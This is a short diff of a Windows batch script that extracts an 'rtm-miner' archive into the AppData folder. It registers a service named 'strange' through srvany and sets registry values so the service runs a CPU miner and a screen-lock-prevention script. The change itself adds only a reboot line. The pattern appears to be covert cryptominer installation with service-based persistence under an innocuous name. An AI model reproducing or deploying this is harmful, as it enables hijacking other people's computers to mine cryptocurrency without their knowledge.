@@ -21,3 +21,4 @@ start "%appdata%\7z.exe" x "%appdata%\rtm-miner.zip"
 call instsrv strange "%appdata%\srvany.exe"
 call reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\strange\Parameters\ /v Application /t REG_SZ /d "%appdata%\rtm-miner\cpuminer.bat" /f 
 call reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\strange\Parameters\ /v Application /t REG_SZ /d "%appdata%\prevent-screen-lock.ps1" /f 
+reboot
